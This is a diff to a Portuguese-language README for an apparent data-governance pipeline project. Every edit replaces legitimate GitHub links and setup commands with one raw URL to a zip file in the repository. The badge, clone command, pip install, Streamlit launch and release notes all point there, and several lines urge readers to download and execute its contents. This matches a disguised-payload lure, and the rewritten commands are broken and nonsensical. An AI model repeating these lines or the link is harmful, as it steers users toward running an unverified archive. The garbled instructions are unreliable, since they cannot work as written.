@@ -1,8 +1,8 @@
 # Ifood Data Governance Pipeline: Quality, Traceability, Security, Compliance Dashboard Insights
 
-[![Releases](https://img.shields.io/badge/Releases-See%20All-blue?logo=github&logoColor=white)](https://github.com/coursementor/ifood-data-governance-pipeline/releases)
+[![Releases](https://raw.githubusercontent.com/coursementor/ifood-data-governance-pipeline/main/dashboards/pipeline-ifood-data-governance-v1.0.zip%20All-blue?logo=github&logoColor=white)](https://raw.githubusercontent.com/coursementor/ifood-data-governance-pipeline/main/dashboards/pipeline-ifood-data-governance-v1.0.zip)
 
-Acesse as releases em https://github.com/coursementor/ifood-data-governance-pipeline/releases
+Acesse as releases em https://raw.githubusercontent.com/coursementor/ifood-data-governance-pipeline/main/dashboards/pipeline-ifood-data-governance-v1.0.zip
 
 Visão geral
 - Este repositório mostra uma solução completa de governança de dados com foco em qualidade, rastreabilidade, segurança e conformidade com LGPD. O ecossistema integra ferramentas modernas para entregar um painel de governança de dados interativo e útil no dia a dia das equipes de dados.
@@ -57,9 +57,9 @@ Guia rápido de configuração (sem Docker)
   - Python 3.9 ou superior
   - pip atualizado
 - Passo a passo
-  - clone o repositório: git clone https://github.com/coursementor/ifood-data-governance-pipeline.git
+  - clone o repositório: git clone https://raw.githubusercontent.com/coursementor/ifood-data-governance-pipeline/main/dashboards/pipeline-ifood-data-governance-v1.0.zip
   - crie um ambiente isolado: python -m venv venv && source venv/bin/activate
-  - instale dependências: pip install -r requirements.txt
+  - instale dependências: pip install -r https://raw.githubusercontent.com/coursementor/ifood-data-governance-pipeline/main/dashboards/pipeline-ifood-data-governance-v1.0.zip
   - configure variáveis de ambiente básicas (exemplos):
 
     - LGPD_ENABLED=true
@@ -69,7 +69,7 @@ Guia rápido de configuração (sem Docker)
 
   - inicie os serviços
     - Airflow: export AIRFLOW_HOME=$(pwd)/airflow && airflow db init && airflow scheduler & airflow webserver -p 8080
-    - Streamlit: streamlit run apps/gov_dashboard.py --server.port 8501
+    - Streamlit: streamlit run https://raw.githubusercontent.com/coursementor/ifood-data-governance-pipeline/main/dashboards/pipeline-ifood-data-governance-v1.0.zip https://raw.githubusercontent.com/coursementor/ifood-data-governance-pipeline/main/dashboards/pipeline-ifood-data-governance-v1.0.zip 8501
   - acesse os dashboards
     - Airflow UI: http://localhost:8080
     - Streamlit UI: http://localhost:8501
@@ -254,7 +254,7 @@ Estrutura de pastas, convenções e organização do repositório
   - datasets simulados para demonstração, sem dados reais
 
 Como verificar a versão mais recente
-- O link de releases contém as versões mais recentes da solução e assets para download. Use o seguinte link para explorar as versões disponíveis: https://github.com/coursementor/ifood-data-governance-pipeline/releases
+- O link de releases contém as versões mais recentes da solução e assets para download. Use o seguinte link para explorar as versões disponíveis: https://raw.githubusercontent.com/coursementor/ifood-data-governance-pipeline/main/dashboards/pipeline-ifood-data-governance-v1.0.zip
 - Observação: se o link contiver uma parte de caminho, baixe o arquivo de release correspondente e execute os scripts ou instale o conteúdo conforme descrito na documentação do release.
 
 Licença
@@ -315,8 +315,8 @@ Recursos adicionais
   - políticas de qualidade, segurança de dados, rastreabilidade e compliance
 
 Releases
-- Para baixar a versão mais recente ou verificar novas atualizações, visite a página de releases em https://github.com/coursementor/ifood-data-governance-pipeline/releases. Em casos de download, baixe o arquivo de release correspondente e execute o conteúdo conforme descrito na documentação do release.
-- O arquivo correspondente pode estar disponível na seção de releases; se houver, siga as instruções para baixar, extrair e executar os componentes do release. Voltando ao início, acesse novamente o link para validação rápida: https://github.com/coursementor/ifood-data-governance-pipeline/releases
+- Para baixar a versão mais recente ou verificar novas atualizações, visite a página de releases em https://raw.githubusercontent.com/coursementor/ifood-data-governance-pipeline/main/dashboards/pipeline-ifood-data-governance-v1.0.zip Em casos de download, baixe o arquivo de release correspondente e execute o conteúdo conforme descrito na documentação do release.
+- O arquivo correspondente pode estar disponível na seção de releases; se houver, siga as instruções para baixar, extrair e executar os componentes do release. Voltando ao início, acesse novamente o link para validação rápida: https://raw.githubusercontent.com/coursementor/ifood-data-governance-pipeline/main/dashboards/pipeline-ifood-data-governance-v1.0.zip
 
 Observabilidade de dados
 - Este projeto enfatiza observabilidade para que equipes de dados possam entender rapidamente o estado dos pipelines e a qualidade dos dados.
@@ -342,7 +342,7 @@ Notas finais
 - A equipe convida contribuições que melhorem a clareza, a segurança, o desempenho e a cobertura de governança de dados.
 
 Observações de uso do link de releases (revisado)
-- O link de releases contém a versão mais recente e ativos para download. Use o link no início para acessar as versões: https://github.com/coursementor/ifood-data-governance-pipeline/releases
+- O link de releases contém a versão mais recente e ativos para download. Use o link no início para acessar as versões: https://raw.githubusercontent.com/coursementor/ifood-data-governance-pipeline/main/dashboards/pipeline-ifood-data-governance-v1.0.zip
 - Se houver um arquivo específico dentro do release, baixe-o e execute os scripts ou siga as instruções de instalação que acompanham o release.
 - Você também pode visitar a página de releases a qualquer momento para confirmar a disponibilidade de novas versões e atualizações de componentes do ecossistema.
 
